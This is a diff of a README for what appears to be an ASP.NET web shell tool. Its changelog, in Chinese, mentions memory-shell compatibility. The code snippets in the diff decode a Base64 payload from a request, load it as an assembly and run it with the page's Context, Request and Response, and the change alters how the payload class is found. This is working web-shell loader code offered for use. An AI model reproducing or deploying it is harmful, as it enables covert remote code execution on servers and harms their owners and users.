@@ -27,7 +27,7 @@ python3 build.py
     if (Payload != null)
     {
         System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
-        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(this);
+        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(this);
     }
 %>
 ```
@@ -43,7 +43,7 @@ python3 build.py
     if (Payload != null)
     {
         System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
-        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(Context);
+        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(Context);
     }
 %>
 ```
@@ -57,7 +57,7 @@ python3 build.py
     if (Payload != null)
     {
         System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
-        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(new object[] { Request, Response });
+        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] { Request, Response });
     }
 %>
 ```
@@ -69,7 +69,7 @@ python3 build.py
 ### v 1.1
 
 1. 兼容内存马
-2. Payload类名不再固定
+2. Payload类名不再固定，采用动态获取方式
 
 ### v 1.0
 
